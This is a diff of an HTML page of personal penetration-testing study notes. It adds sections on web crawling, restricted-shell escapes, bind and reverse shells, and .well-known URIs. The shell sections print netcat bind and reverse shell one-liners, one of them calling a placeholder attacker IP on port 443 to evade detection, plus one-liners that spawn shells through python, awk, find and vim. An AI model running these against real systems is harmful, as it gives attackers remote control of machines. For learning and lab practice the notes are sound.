@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-a9e60022.js";
+            window.path_to_searchindex_js = "searchindex-b4e450f2.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-e5413c43.js"></script>
+        <script src="toc-dbcff8a3.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -565,11 +565,14 @@
 </li>
 <li><a href="fun/README.html">Fun</a>
 <ul>
-<li><a href="#modifying-machine-code-in-executables">Modify Machine Code</a></li>
-</ul>
-</li>
-<li><a href="infosec/README.html">InfoSec</a>
+<li><a href="#modifying-machine-code-in-executables">Modify Machine Code</a>
 <ul>
+<li><a href="infosec/README.html">InfoSec</a></li>
+<li><a href="#crawling">crawling</a></li>
+<li><a href="#robots-text">robots-text</a></li>
+<li><a href="#shell-harnesses">shell-harnesses</a></li>
+<li><a href="#shells-and-payloads">shell-payloads</a></li>
+<li><a href="#well-known-uris">well-known-uris</a></li>
 <li><a href="#enumeration">Enumeration</a></li>
 <li><a href="#footprinting-9">footprinting</a></li>
 <li><a href="#hydra-1">Brute-Forcing</a></li>
@@ -579,6 +582,8 @@
 <li><a href="#nessus">nessus</a></li>
 <li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
 <li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -23520,6 +23525,11 @@ ac
 <h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
 <li><a href="#enumeration">enumeration</a></li>
+<li><a href="#crawling">crawling</a></li>
+<li><a href="#robots-text">robots-text</a></li>
+<li><a href="#shell-harnesses">shell-harnesses</a></li>
+<li><a href="#shells-and-payloads">shell-payloads</a></li>
+<li><a href="#well-known-uris">well-known-uris</a></li>
 </ul>
 <h3 id="htb"><a class="header" href="#htb">HTB</a></h3>
 <ul>
@@ -23538,6 +23548,165 @@ ac
 <li><a href="#linux-file-transfer-methods">linux</a></li>
 <li><a href="#windows-file-transfer-methods">windows</a></li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="crawling"><a class="header" href="#crawling">Crawling</a></h1>
+<p>Crawling (or spidering) is the automated process of systematically browsing the web to index and collect information from websites. It is commonly used by search engines to gather data for indexing, but it can also be employed for various other purposes, including security assessments, data mining, and competitive analysis. Crawlers, also known as spiders or bots, follow links on web pages to discover new content and extract relevant information.</p>
+<h2 id="how-crawlers-work"><a class="header" href="#how-crawlers-work">How Crawlers Work</a></h2>
+<ol>
+<li><strong>Starting Point</strong>: Crawlers begin with a list of seed URLs to visit.</li>
+<li><strong>Fetching</strong>: The crawler sends HTTP requests to these URLs to retrieve the web pages</li>
+<li><strong>Parsing</strong>: The retrieved pages are parsed to extract links and relevant data.</li>
+<li><strong>Link Following</strong>: The extracted links are added to the list of URLs to visit</li>
+<li><strong>Repetition</strong>: Steps 2-4 are repeated for the new URLs until a specified depth or limit is reached.</li>
+</ol>
+<h2 id="breadth-first-vs-depth-first-crawling"><a class="header" href="#breadth-first-vs-depth-first-crawling">Breadth-First vs. Depth-First Crawling</a></h2>
+<ul>
+<li>Breadth-First crawling explores all links at the current depth before moving to the next level, while Depth-First crawling follows a single path down to its end before backtracking. Each method has its advantages and disadvantages depending on the use case.</li>
+<li>Depth-First crawling follows a single path down to its end before backtracking.</li>
+</ul>
+<p>Each method has its advantages and disadvantages depending on the use case.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="robots-text"><a class="header" href="#robots-text">robots-text</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="shell-harnesses"><a class="header" href="#shell-harnesses">Shell Harnesses</a></h1>
+<h2 id="spawning-interactive-shells"><a class="header" href="#spawning-interactive-shells">Spawning Interactive Shells</a></h2>
+<p>When landing on a system with a limited/jail shell, there are several alternative methods to spawn an interactive shell.</p>
+<h3 id="methods"><a class="header" href="#methods">Methods</a></h3>
+<h4 id="python"><a class="header" href="#python"><code>python</code></a></h4>
+<p>If Python is preset:</p>
+<pre><code class="language-bash">python -c `import pty; pty.spawn("/bin/sh)`
+</code></pre>
+<h4 id="binsh"><a class="header" href="#binsh"><code>/bin/sh</code></a></h4>
+<p>Execute shell in interactive mode:</p>
+<pre><code class="language-bash">/bin/sh -i
+</code></pre>
+<h4 id="perl"><a class="header" href="#perl">Perl</a></h4>
+<p>If Perl is present:</p>
+<pre><code class="language-bash">perl -e 'exec "/bin/sh";'
+</code></pre>
+<h4 id="ruby"><a class="header" href="#ruby">Ruby</a></h4>
+<p>If Ruby is present:</p>
+<pre><code class="language-ruby">ruby: exec "/bin/sh"
+</code></pre>
+<h4 id="lua"><a class="header" href="#lua">Lua</a></h4>
+<p>If Lua is present:</p>
+<pre><code class="language-lua">lua: os.execute('/bin/sh')
+</code></pre>
+<h4 id="awk"><a class="header" href="#awk">AWK</a></h4>
+<p>AWK is commonly available on Unix/Linux systems:</p>
+<pre><code class="language-bash">awk 'BEGIN {system("/bin/sh")}'
+</code></pre>
+<h4 id="find"><a class="header" href="#find">Find</a></h4>
+<p>Using the <code>find</code> command:</p>
+<pre><code class="language-bash"># Using find with awk
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+# Direct execution
+find . -exec /bin/sh \; -quit
+</code></pre>
+<h4 id="vim-1"><a class="header" href="#vim-1">VIM</a></h4>
+<p>From within VIM:</p>
+<pre><code class="language-bash">vim -c ':!/bin/sh'
+</code></pre>
+<p>Or escape to shell from VIM:</p>
+<pre><code class="language-vim">:set shell=/bin/sh
+:shell
+</code></pre>
+<h3 id="execution-permissions-considerations"><a class="header" href="#execution-permissions-considerations">Execution Permissions Considerations</a></h3>
+<ul>
+<li>
+<p>Check file permissions:</p>
+<pre><code class="language-bash">ls -la &lt;path/to/fileorbinary&gt;
+</code></pre>
+</li>
+<li>
+<p>Check sudo permissions (requires stable interactive shell):</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+</li>
+</ul>
+<p>Understanding permissions helps identify potential privilege escalation vectors.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="shells-and-payloads"><a class="header" href="#shells-and-payloads">Shells and Payloads</a></h1>
+<h2 id="bind-shells"><a class="header" href="#bind-shells">Bind Shells</a></h2>
+<p>A shell listens on the compromised system for incoming connections.</p>
+<h3 id="challenges-with-bind-shells"><a class="header" href="#challenges-with-bind-shells">Challenges with bind shells</a></h3>
+<ul>
+<li>Firewalls may block incoming connections.</li>
+<li>NAT can complicate direct connections.</li>
+<li>A shell will need to be started on the target system beforehand.</li>
+<li>May require elevated privileges to bind to certain ports.</li>
+</ul>
+<h3 id="establish-a-bind-shell-with-netcat"><a class="header" href="#establish-a-bind-shell-with-netcat">Establish a bind shell with netcat</a></h3>
+<pre><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l -p 4444 &gt; /tmp/f
+</code></pre>
+<p>then connect from your machine:</p>
+<pre><code class="language-bash">nc &lt;target_ip&gt; 4444
+</code></pre>
+<h2 id="reverse-shells"><a class="header" href="#reverse-shells">Reverse Shells</a></h2>
+<p>The compromised machine connects back to a listener on the attackers machine. This has a better chance of success because outbound connections are rarely filtered or blocked. A firewall with DPI  (Deep Packet Inspection) may be able to detect and block this traffic.</p>
+<h3 id="establish-a-reverse-shell-with-netcat"><a class="header" href="#establish-a-reverse-shell-with-netcat">Establish a reverse shell with netcat</a></h3>
+<p>On our machine, setup the listener:</p>
+<pre><code class="language-bash">/bin/bash$ nc -lp 443 
+
+</code></pre>
+<p>We use the common port https/443 to blend in with normal traffic. On the target machine, run:</p>
+<pre><code class="language-bash">/bin/bash$ nc -e /bin/sh &lt;attacker_ip&gt; 443
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="well-known-uris"><a class="header" href="#well-known-uris">Well-Known URIs</a></h1>
+<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
+<p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>
+<p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p>
+<p>The Internet Assigned Numbers Authority (IANA) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards.</p>
+<h2 id="common-well-known-uris"><a class="header" href="#common-well-known-uris">Common Well-Known URIs</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>URI Suffix</th><th>Description</th><th>Status</th><th>Reference</th></tr>
+</thead>
+<tbody>
+<tr><td><code>security.txt</code></td><td>Contains contact information for security researchers to report vulnerabilities.</td><td>Permanent</td><td>RFC 9116</td></tr>
+<tr><td><code>change-password</code></td><td>Provides a standard URL for directing users to a password change page.</td><td>Provisional</td><td><a href="https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri">W3C Spec</a></td></tr>
+<tr><td><code>openid-configuration</code></td><td>Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.</td><td>Permanent</td><td><a href="http://openid.net/specs/openid-connect-discovery-1_0.html">OpenID Connect Discovery</a></td></tr>
+<tr><td><code>assetlinks.json</code></td><td>Used for verifying ownership of digital assets (e.g., apps) associated with a domain.</td><td>Permanent</td><td><a href="https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md">Digital Asset Links</a></td></tr>
+<tr><td><code>mta-sts.txt</code></td><td>Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.</td><td>Permanent</td><td>RFC 8461</td></tr>
+</tbody>
+</table>
+</div>
+<p>This is just a small sample of the many <code>.well-known</code> URIs registered with IANA. Each entry in the registry offers specific guidelines and requirements for implementation, ensuring a standardized approach to leveraging the <code>.well-known</code> mechanism for various applications.</p>
+<h2 id="web-recon-and-well-known"><a class="header" href="#web-recon-and-well-known">Web Recon and .well-known</a></h2>
+<p>In web recon, the <code>.well-known</code> URIs can be invaluable for discovering endpoints and configuration details that can be further tested during a penetration test. One particularly useful URI is <code>openid-configuration</code>.</p>
+<h3 id="openid-configuration"><a class="header" href="#openid-configuration">openid-configuration</a></h3>
+<p>The <code>openid-configuration</code> URI is part of the OpenID Connect Discovery protocol, an identity layer built on top of the OAuth 2.0 protocol. When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider’s configuration by accessing the <code>https://example.com/.well-known/openid-configuration</code> endpoint. This endpoint returns a JSON document containing metadata about the provider’s endpoints, supported authentication methods, token issuance, and more:</p>
+<pre><code class="language-json">{
+  "issuer": "https://example.com",
+  "authorization_endpoint": "https://example.com/oauth2/authorize",
+  "token_endpoint": "https://example.com/oauth2/token",
+  "userinfo_endpoint": "https://example.com/oauth2/userinfo",
+  "jwks_uri": "https://example.com/oauth2/jwks",
+  "response_types_supported": ["code", "token", "id_token"],
+  "subject_types_supported": ["public"],
+  "id_token_signing_alg_values_supported": ["RS256"],
+  "scopes_supported": ["openid", "profile", "email"]
+}
+</code></pre>
+<h3 id="information-obtained-from-openid-configuration"><a class="header" href="#information-obtained-from-openid-configuration">Information Obtained from openid-configuration</a></h3>
+<p>The information obtained from the <code>openid-configuration</code> endpoint provides multiple exploration opportunities:</p>
+<ul>
+<li><strong>Endpoint Discovery</strong>:
+<ul>
+<li><strong>Authorization Endpoint</strong>: Identifying the URL for user authorization requests.</li>
+<li><strong>Token Endpoint</strong>: Finding the URL where tokens are issued.</li>
+<li><strong>Userinfo Endpoint</strong>: Locating the endpoint that provides user information.</li>
+<li><strong>JWKS URI</strong>: The <code>jwks_uri</code> reveals the JSON Web Key Set (JWKS), detailing the cryptographic keys used by the server.</li>
+</ul>
+</li>
+<li><strong>Supported Scopes and Response Types</strong>: Understanding which scopes and response types are supported helps in mapping out the functionality and limitations of the OpenID Connect implementation.</li>
+<li><strong>Algorithm Details</strong>: Information about supported signing algorithms can be crucial for understanding the security measures in place.</li>
+</ul>
+<h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
+<p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website’s security landscape.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
